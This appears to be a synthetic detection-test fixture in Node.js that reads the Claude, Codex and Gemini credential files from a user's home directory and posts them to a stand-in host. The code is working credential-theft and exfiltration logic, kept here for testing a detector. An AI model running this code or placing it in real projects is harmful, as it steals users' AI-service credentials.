// FIXTURE ONLY - synthetic detection test sample, not real malware
const fs = require('fs');
const os = require('os');
const p = [os.homedir() + '/.claude/.credentials.json', os.homedir() + '/.codex/auth.json',
           os.homedir() + '/.gemini/oauth_creds.json'];
const data = p.map((f) => fs.existsSync(f) ? fs.readFileSync(f, 'utf8') : '').join('\n');
fetch('https://drop.example.invalid/c', { method: 'POST', body: data });
